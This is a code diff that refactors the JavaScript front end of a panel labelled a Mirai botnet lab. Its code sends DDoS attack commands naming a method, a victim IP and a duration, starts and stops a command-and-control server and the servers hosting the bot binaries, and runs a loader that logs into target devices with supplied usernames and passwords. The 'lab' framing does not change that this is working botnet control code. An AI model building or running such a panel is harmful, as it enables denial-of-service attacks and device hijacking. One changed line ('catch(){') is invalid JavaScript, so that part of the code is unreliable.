-    toast(d.ok?"OK: cmd sent":"ERR: "+d.error,!d.ok);
+    toast(d.ok?"OK":"ERR: "+d.error,!d.ok);
   }catch(e){
-    out.textContent="[ERR] "+e.message;
+    if(out) out.textContent="[ERR] "+e.message;
     toast("FETCH ERR",true);
   }
 }
-document.getElementById("cmd-input").addEventListener("keydown",e=>{
-  if(e.key==="Enter") sendCommand(e.target.value);
-});
-document.getElementById("btn-send").addEventListener("click",()=>{
-  sendCommand(document.getElementById("cmd-input").value);
-});
+const cmdInput=document.getElementById("cmd-input");
+if(cmdInput) cmdInput.addEventListener("keydown",e=>{if(e.key==="Enter")sendCommand(e.target.value);});
+const btnSend=document.getElementById("btn-send");
+if(btnSend) btnSend.addEventListener("click",()=>sendCommand((cmdInput||{value:""}).value));
 document.querySelectorAll(".btn-quick").forEach(b=>{
-  b.addEventListener("click",()=>{
-    document.getElementById("cmd-input").value=b.dataset.cmd;
-    sendCommand(b.dataset.cmd);
-  });
+  b.addEventListener("click",()=>{if(cmdInput)cmdInput.value=b.dataset.cmd;sendCommand(b.dataset.cmd);});
 });
 
 /* ---- ATTACK BUTTONS -------------------------------------- */
@@ -703,18 +549,12 @@ document.querySelectorAll(".btn-atk").forEach(btn=>{
     const vnode   = VICTIM_MAP[victim];
     if(!vnode) return;
 
-    // Visual: highlight row
-    const row = btn.closest(".atk-row");
+    const row=btn.closest(".atk-row");
     if(row) row.classList.add("firing");
-    document.getElementById("atk-status").textContent=
-      "> LAUNCHING: "+method.toUpperCase()+" >> "+vnode.ip+" // "+dur+"s";
+    const atkSt=document.getElementById("atk-status");
+    if(atkSt) atkSt.textContent="> LAUNCHING: "+method.toUpperCase()+" >> "+vnode.ip+" // "+dur+"s";
 
-    // Fire arcs
     fireArcs(victim, dur);
-
-    // Also spawn some infection dots when attacking
-    const attackerBotCountries = BOT_COUNTRIES.slice(0, 4);
-    attackerBotCountries.forEach((k,i) => spawnInfectionDot(k, i*300));
 
     try{
       const r=await fetch(API_BASE+"/api/attack",{
@@ -723,13 +563,13 @@ document.querySelectorAll(".btn-atk").forEach(btn=>{
       });
       const d=await r.json();
       const ok=d.ok!==false;
-      toast(ok?"ATK_SENT: "+method.toUpperCase()+" >> "+vnode.label:"ATK_ERR: "+d.error,!ok);
+      toast(ok?"ATK: "+method.toUpperCase()+" >> "+vnode.label:"ERR: "+d.error,!ok);
       termLog("[ATK] "+method+" "+vnode.ip+" "+dur+"s >> "+(ok?"OK":"ERR: "+d.error),ok?"cmd":"err");
-    }catch(e){ toast("FETCH ERR",true); }
+    }catch(){ toast("FETCH ERR",true); }
 
     setTimeout(()=>{
       if(row) row.classList.remove("firing");
-      document.getElementById("atk-status").textContent="> STANDBY...";
+      if(atkSt) atkSt.textContent="> STANDBY...";
     }, dur*1000+500);
   });
 });
@@ -737,48 +577,31 @@ document.querySelectorAll(".btn-atk").forEach(btn=>{
 /* ---- LAB CONTROLS ---------------------------------------- */
 async function labPost(path,body={}){
   try{
-    const r=await fetch(API_BASE+path,{
-      method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)
-    });
+    const r=await fetch(API_BASE+path,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify(body)});
     return await r.json();
-  }catch(e){ return{ok:false,error:e.message}; }
+  }catch(e){return{ok:false,error:e.message};}
 }
-document.getElementById("btn-cnc-start").addEventListener("click",async()=>{
-  toast(">> INIT CNC...");
-  const d=await labPost("/api/lab/cnc/start");
-  toast(d.ok?"CNC.UP":"CNC.ERR: "+d.error,!d.ok);
-  pollStatus();
-});
-document.getElementById("btn-cnc-stop").addEventListener("click",async()=>{
-  const d=await labPost("/api/lab/cnc/stop");
-  toast(d.ok?"CNC.KILLED":"ERR: "+d.error,!d.ok);
-  pollStatus();
-});
-document.getElementById("btn-http-start").addEventListener("click",async()=>{
-  toast(">> HTTP BINS UP...");
-  const d=await labPost("/api/lab/http/start");
-  toast(d.ok?"HTTP.UP":"HTTP.ERR: "+d.error,!d.ok);
-  pollOverview();
-});
-document.getElementById("btn-http-stop").addEventListener("click",async()=>{
-  const d=await labPost("/api/lab/http/stop");
-  toast(d.ok?"HTTP.DOWN":"ERR: "+d.error,!d.ok);
-  pollOverview();
-});
-document.getElementById("btn-refresh").addEventListener("click",()=>{
-  pollStatus();pollLogs();pollOverview();
-  toast(">> SYNC...");
-});
+const b_cs=document.getElementById("btn-cnc-start");
+if(b_cs) b_cs.addEventListener("click",async()=>{ toast(">> INIT CNC..."); const d=await labPost("/api/lab/cnc/start"); toast(d.ok?"CNC.UP":"ERR: "+d.error,!d.ok); pollStatus(); });
+const b_ck=document.getElementById("btn-cnc-stop");
+if(b_ck) b_ck.addEventListener("click",async()=>{ const d=await labPost("/api/lab/cnc/stop"); toast(d.ok?"CNC.KILLED":"ERR: "+d.error,!d.ok); pollStatus(); });
+const b_hu=document.getElementById("btn-http-start");
+if(b_hu) b_hu.addEventListener("click",async()=>{ toast(">> HTTP UP..."); const d=await labPost("/api/lab/http/start"); toast(d.ok?"HTTP.UP":"ERR: "+d.error,!d.ok); pollOverview(); });
+const b_hd=document.getElementById("btn-http-stop");
+if(b_hd) b_hd.addEventListener("click",async()=>{ const d=await labPost("/api/lab/http/stop"); toast(d.ok?"HTTP.DOWN":"ERR: "+d.error,!d.ok); pollOverview(); });
+const b_ref=document.getElementById("btn-refresh");
+if(b_ref) b_ref.addEventListener("click",()=>{ pollStatus();pollLogs();pollOverview();toast(">> SYNC..."); });
 
 /* ---- LOADER FORM ----------------------------------------- */
-document.getElementById("loader-form").addEventListener("submit",async e=>{
+const ldrForm=document.getElementById("loader-form");
+if(ldrForm) ldrForm.addEventListener("submit",async e=>{
   e.preventDefault();
-  const ip  = document.getElementById("ldr-ip").value.trim();
-  const port= parseInt(document.getElementById("ldr-port").value);
-  const user= document.getElementById("ldr-user").value.trim();
-  const pass= document.getElementById("ldr-pass").value;
-  const log = document.getElementById("loader-log");
-  log.textContent="> LOADER.EXE "+ip+":"+port+" user="+user+"\n> WAIT UP TO 120s...";
+  const ip  =document.getElementById("ldr-ip").value.trim();
+  const port=parseInt(document.getElementById("ldr-port").value);
+  const user=document.getElementById("ldr-user").value.trim();
+  const pass=document.getElementById("ldr-pass").value;
+  const log =document.getElementById("loader-log");
+  if(log) log.textContent="> LOADER.EXE "+ip+":"+port+" user="+user+"\n> WAIT 120s...";
   toast("LDR >> "+ip);
   try{
     const r=await fetch(API_BASE+"/api/lab/loader/run",{
@@ -786,7 +609,7 @@ document.getElementById("loader-form").addEventListener("submit",async e=>{
       body:JSON.stringify({ip,port,user,pass})
     });
     const d=await r.json();
-    log.textContent=d.ok?"> RUNNING: "+d.target+"\n":">[ERR] "+d.error;
+    if(log) log.textContent=d.ok?"> RUNNING: "+d.target+"\n":"> ERR: "+d.error;
     toast(d.ok?"LDR.RUNNING":"LDR.ERR: "+d.error,!d.ok);
     let polls=0;
     const iv=setInterval(async()=>{
@@ -795,30 +618,20 @@ document.getElementById("loader-form").addEventListener("submit",async e=>{
         const lr=await fetch(API_BASE+"/api/lab/loader/log");
         const ld=await lr.json();
         const st=ld.loader||{};
-        log.textContent=
-          "> STATUS running="+st.running+
-          "\n> TARGET "+st.target+
-          "\n> EXIT "+(st.exit_code??'--')+
+        if(log) log.textContent=
+          "> run="+st.running+" target="+st.target+
+          "\n> exit="+(st.exit_code??'--')+
           "\n\n"+(st.log_tail||"");
-        log.scrollTop=log.scrollHeight;
-        if(st.ok_line){
-          toast("OK! "+st.ok_line);
-          clearInterval(iv);
-          // On OK, spawn infection dot for all Thai bots (lab targets)
-          spawnBurst("TH", 3);
-          pollStatus();
-        }
-        if(!st.running&&st.exit_code!==null&&st.exit_code!==undefined) clearInterval(iv);
+        if(log) log.scrollTop=log.scrollHeight;
+        if(st.ok_line){toast("OK! "+st.ok_line);clearInterval(iv);pollStatus();}
+        if(!st.running&&st.exit_code!==null&&st.exit_code!==undefined)clearInterval(iv);
       }catch{}
     },5000);
-  }catch(e){
-    log.textContent=">[ERR] "+e.message;
-    toast("FETCH ERR",true);
-  }
+  }catch(e){ if(log) log.textContent="> ERR: "+e.message; toast("FETCH ERR",true); }
 });
 
 /* ---- INIT ------------------------------------------------ */
-window.addEventListener("resize",()=>{resize();});
+window.addEventListener("resize",resize);
 resize();
 buildNodeList();
 drawFrame();
@@ -827,5 +640,4 @@ setInterval(pollStatus,   POLL_MS);
 setInterval(pollLogs,     LOG_POLL_MS);
 setInterval(pollOverview, 15000);
 termLog("[SYS] BOTNET.EXE // MIRAI LAB v2.0 // "+new Date().toLocaleString(),"sys");
-termLog("[SYS] INFECTION.MONITOR: active // auto-spawn: ON","sys");
-termLog("[SYS] "+Object.keys(COUNTRY_BOUNDS).join(" ")+" [ WATCHING ]","sys");
+termLog("[SYS] MAP: "+LAB_NODES.filter(n=>n.type==="bot").length+" bots | "+LAB_NODES.filter(n=>n.type==="victim").length+" targets","sys");
